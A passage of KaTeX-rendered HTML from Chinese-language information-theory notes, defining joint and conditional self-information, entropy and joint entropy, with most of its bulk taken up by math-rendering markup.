style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>同时出现，联合自信息量定义为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">{I(x_i,y_j)=-\log_2p(x_i,y_j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><ul><li>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">x_{i},y_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>相互独立时，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(x_i,y_j)=p(x_i)p(y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">=</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">+</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_i,y_j){=}I(x_i){+}I(y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mrel">=</span></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord">+</span></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul></li><li><p>**条件自信息量：**若两个消息不是独立的，则事件<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>出现的条件下，随机事件x_{i}发生的条件自信息量定义为条件概率对数的负值：</p></li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo lspace="0em" rspace="0em">=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_i/y_j){=}-\log_2p(x_i/y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><h2 id="熵及其性质"><a class="markdownIt-Anchor" href="#熵及其性质"></a> 熵及其性质</h2><h3 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h3><p><strong>定义</strong>：信源的平均不确定度H(x)(信息熵)为信源中<strong>各个符号的不确定度</strong>的数学期望</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">[</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>=</mo><munder><mo>∑</mo><mi>i</mi></munder><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mi>i</mi></munder><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}H(X)=E[I(X)]=\sum_ip(x_i)I(x_i)=-\sum_ip(x_i)\log(p(x_i))\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.6276740000000003em;vertical-align:-1.0638370000000001em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5638370000000001em;"><span style="top:-3.5638370000000004em;"><span class="pstrut" style="height:3.0500050000000005em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0638370000000001em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>单位为 <strong>比特/符号</strong> 或者 <strong>比特/符号序列</strong></li><li>表示信源x每发一个符号所提供的平均信息量</li></ul><p><strong>联合熵</strong>是联合符号集合XY上的每个元素对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_{i},y_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的自信息量的概率加权平均值，定义为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}H(XY)=\sum_{i,j}p(x_i,y_j)I(x_i,y_j)&amp;=-\sum_{i,j}p(x_i,y_j)\log p(x_i,y_j)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.763782em;vertical-align:-1.1318910000000002em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6318909999999998em;"><span style="top:-3.631891em;"><span class="pstrut" style="height:3.050005em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span 